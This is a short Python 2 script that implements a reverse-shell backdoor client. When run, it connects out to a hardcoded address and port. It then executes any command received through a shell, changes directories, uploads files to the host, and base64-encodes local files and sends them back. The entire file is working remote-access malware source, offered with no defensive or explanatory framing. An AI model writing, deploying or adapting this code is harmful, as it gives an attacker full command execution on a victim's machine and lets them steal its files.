import socket
import subprocess
import json
import os
import base64
# use python2 in this prog


class client:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # connect method takes a tuple of target_ip and port
        self.connection.connect((self.ip, self.port))

    def read_file(self, path):
        try:
            with open(path, "rb") as f:
                return base64.b64encode(f.read())
        except Exception as e:
            raise(e)

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            return "Uploaded Successfully!"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_dir(self, dir_path):
        os.chdir(dir_path)
        return "Working directory changed to " + os.getcwd()

    def execute_comm(self, command):
        return subprocess.check_output(command, shell=True)

    def take_command(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_dir(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif(command[0] == "upload"):
                    up_data = self.reliable_receive()
                    command_result = self.write_file(command[1], up_data)
                else:
                    command_result = self.execute_comm(command)
            except Exception as e:
                command_result = str(e)
            self.reliable_send(command_result)


b1 = client("192.168.43.37", 6575)
b1.take_command()
